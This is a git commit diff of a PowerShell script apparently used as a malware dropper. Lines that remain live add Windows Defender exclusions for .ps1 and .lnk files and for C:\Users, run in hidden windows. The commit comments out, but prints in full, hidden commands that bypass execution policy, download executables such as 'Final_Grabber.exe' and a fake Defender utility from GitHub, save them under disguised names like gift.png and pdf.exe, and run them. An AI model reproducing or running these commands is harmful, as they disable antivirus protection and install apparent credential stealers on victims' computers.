83b22cd7c22f08376e8b61f63f8008c32cb58e95
rude90 <115774095+rude90@users.noreply.github.com>
2023-06-09 08:10:40 +0500

    Update py_script_testing.ps1

--- py_script_testing.ps1
+++ py_script_testing.ps1
@@ -3,17 +3,17 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/test/raw/main/cyber-attack%20(1).png -o C:\Users\gift.png
-powershell.exe -w Hidden C:\Users\gift.png
+# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/test/raw/main/cyber-attack%20(1).png -o C:\Users\gift.png
+# powershell.exe -w Hidden C:\Users\gift.png
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf.exe
-powershell.exe -w Hidden C:\Users\pdf.exe
+# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf.exe
+# powershell.exe -w Hidden C:\Users\pdf.exe
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\internet.exe
-powershell.exe -w Hidden C:\Users\internet.exe
+# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\internet.exe
+# powershell.exe -w Hidden C:\Users\internet.exe
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
-powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
+# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
+# powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
 
 
 
